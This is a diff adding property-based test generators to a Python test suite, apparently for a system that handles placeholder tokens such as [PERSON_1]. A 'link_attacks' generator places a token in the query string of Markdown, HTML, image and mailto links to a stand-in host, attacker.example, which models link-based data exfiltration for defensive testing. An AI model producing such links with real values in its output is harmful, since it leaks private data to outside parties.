@@ -253,6 +253,76 @@ def placeholder_texts(draw: st.DrawFn) -> str:
     return "".join(draw(st.lists(pieces, max_size=12)))
 
 
+# Pieces of links (ADR 0003 amendment 1): openers and closers of every context in
+# which a placeholder is kept as written, so generated texts move in and out of them.
+LINK_FRAGMENTS = (
+    "](",
+    "![s](",
+    ")",
+    "(",
+    "<",
+    ">",
+    "https://",
+    "//",
+    "/",
+    "www.",
+    "<https:",
+    "<mailto:",
+    "<img src=",
+    '<a href="',
+    "<p title='",
+    "=",
+    '"',
+    "'",
+    "\n",
+    "\n\n",
+    "[1]: ",
+    "\n[1]:",
+    " ",
+    "?d=",
+)
+
+
+@st.composite
+def link_texts(draw: st.DrawFn) -> str:
+    """Placeholder fragments mixed with pieces of Markdown and HTML links."""
+    pieces = st.one_of(
+        st.sampled_from(PLACEHOLDER_FRAGMENTS),
+        st.sampled_from(LINK_FRAGMENTS),
+        st.text(max_size=3),
+    )
+    return "".join(draw(st.lists(pieces, max_size=16)))
+
+
+LINK_OPENERS = (
+    "![s](",
+    "[x](",
+    "[x](<",
+    "https://attacker.example/",
+    "//attacker.example/",
+    "www.attacker.example/",
+    "<https://attacker.example/",
+    "<mailto:x@attacker.example?body=",
+    '<img src="',
+    "<img src='",
+    "<img src=",
+    '<a title="t" href = "',
+    "[1]: ",
+    "[1]:\n<",
+)
+
+
+@st.composite
+def link_attacks(draw: st.DrawFn, token: str) -> str:
+    """`token` placed inside a link that the text opens, after any text that ends a line."""
+    before = draw(st.sampled_from(["", "Done.\n\n", "Text [PERSON_1] text\n\n", "a b\n"]))
+    opener = draw(st.sampled_from(LINK_OPENERS))
+    middle = draw(st.text(alphabet="abc123/?=&.-_%", max_size=12))
+    after = draw(st.sampled_from(["", ")", ">", '">', "' alt=x>", " more", "\n"]))
+    # `=` before the token: a word character there would make it no token at all.
+    return f"{before}{opener}{middle}={token}{after}"
+
+
 @st.composite
 def any_spans(draw: st.DrawFn, text: str, *, disjoint: bool) -> list[Span]:
     """Hand-made spans over `text`: disjoint (touching allowed), or anything."""
